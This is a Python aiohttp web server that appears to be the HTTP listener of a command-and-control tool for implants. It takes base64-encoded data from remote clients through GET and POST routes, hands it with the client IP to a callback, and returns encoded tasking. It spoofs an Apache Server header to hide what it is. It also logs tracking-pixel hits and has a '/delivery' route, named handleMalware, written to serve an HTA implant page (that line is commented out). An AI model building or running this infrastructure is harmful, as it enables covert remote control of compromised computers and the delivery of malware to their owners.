import asyncio
import base64
import datetime
from aiohttp import web
import urllib.parse


def createGETCallback(cb):
  global callback
  callback = cb

  async def handleWeb(request):
    data = request.match_info.get('data', '')

    try:
      data = urllib.parse.unquote(data)
      data = base64.b64decode(data)
    except:
        print('bad requests happening')
        return web.Response(status=404, content_type='text/html', headers={'Server': 'Apache/2.4'})

    peername = request.transport.get_extra_info('peername')
    if peername is not None:
      host, port = peername

    global callback
    ret = callback(data, host)

    if ret:
      ret = str(base64.b64encode(ret),'ascii')
      return web.Response(text=ret, content_type='text/html', headers={'Server': 'Apache/2.4'})
    return web.Response(status=200, content_type='text/html', headers={'Server': 'Apache/2.4'})

  return handleWeb

def createPOSTCallback(cb):
  global callback
  callback = cb

  async def handleWeb(request):
    if request.can_read_body:
      data = await request.read()

      data = str(data, 'utf-8')
      #try:
      if '%' in data:
        data = urllib.parse.unquote(data)
      data = base64.b64decode(data)
      #except:
      #  return web.Response(status=404, headers={'Server': 'Apache/2.4'})

      peername = request.transport.get_extra_info('peername')
      if peername is not None:
        host, port = peername

      global callback
      ret = callback(data, host)

      if ret:
        ret = str(base64.b64encode(ret),'ascii')
        return web.Response(text=ret, headers={'Server': 'Apache/2.4'})
    return web.Response(status=200, headers={'Server': 'Apache/2.4'})

  return handleWeb

def log(request, s):
  ua = ''

  try:
    if (request.headers["User-Agent"]):
      ua = request.headers["User-Agent"]
  except Exception as e:
    pass

  peername = request.transport.get_extra_info('peername')

  host = ''
  if peername is not None:
    host, port = peername

  print(str(datetime.datetime.now()) + ' ' + host + ' ' + s + ' ' + ua) 

async def handleTelemetry(request):
  data = request.match_info.get('data', '')

  log(request, 'telemetry: ' + data)
  from pathlib import Path
  png = Path('tracking.png').read_bytes()

  return web.Response(body=png, status=200, content_type='image/png', headers={'Server': 'Apache/2.4'})

async def handleMalware(request):
  data = request.match_info.get('data', '')


  log(request, 'malware: ' + data)

  #from pathlib import Path
  #txt = Path('implants/hta/build/implant.html').read_text()
  txt = "404"

  return web.Response(text=txt, status=200, content_type='text/html', headers={'Server': 'Apache/2.4'})

async def startWebServer(cb):
  try:
    app = web.Application()
    app.add_routes([web.get('/{data}', createGETCallback(cb))])
    app.add_routes([web.post('/{data}', createPOSTCallback(cb))])

    app.add_routes([web.get('/telemetry/{data}', handleTelemetry)])
    app.add_routes([web.get('/delivery/{data}', handleMalware)])

    #app.add_routes([web.static('/en', 'static')])

    runner = web.AppRunner(app)

    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 80)
    await site.start()
    print('web server started.')

  except asyncio.CancelledError:
    print('web server stopped.')
    runner.cleanup()
